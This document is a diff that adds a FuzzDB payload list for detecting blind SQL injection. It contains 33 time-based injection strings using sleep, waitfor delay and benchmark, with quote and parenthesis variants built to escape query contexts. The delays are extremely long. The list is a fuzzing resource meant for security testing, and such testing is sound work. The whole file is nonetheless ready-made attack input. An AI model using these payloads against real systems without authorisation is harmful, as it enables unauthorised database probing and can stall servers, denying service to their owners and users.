@@ -1,0 +1,34 @@
+# Source: FuzzDB (https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/sql-injection/detect/GenericBlind.txt)
+
+sleep(200000)
+sleep(200000)#
+1 or sleep(200000)#
+" or sleep(200000)#
+' or sleep(200000)#
+" or sleep(200000)="
+' or sleep(200000)='
+1) or sleep(200000)#
+") or sleep(200000)="
+') or sleep(200000)='
+1)) or sleep(200000)#
+")) or sleep(200000)="
+')) or sleep(200000)='
+;waitfor delay '0:0:200000'--
+);waitfor delay '0:0:200000'--
+';waitfor delay '0:0:200000'--
+";waitfor delay '0:0:200000'--
+');waitfor delay '0:0:200000'--
+");waitfor delay '0:0:200000'--
+));waitfor delay '0:0:200000'--
+'));waitfor delay '0:0:200000'--
+"));waitfor delay '0:0:200000'--
+benchmark(1000000000,MD5(1))#
+1 or benchmark(1000000000,MD5(1))#
+" or benchmark(1000000000,MD5(1))#
+' or benchmark(1000000000,MD5(1))#
+1) or benchmark(1000000000,MD5(1))#
+") or benchmark(1000000000,MD5(1))#
+') or benchmark(1000000000,MD5(1))#
+1)) or benchmark(1000000000,MD5(1))#
+")) or benchmark(1000000000,MD5(1))#
+')) or benchmark(1000000000,MD5(1))#
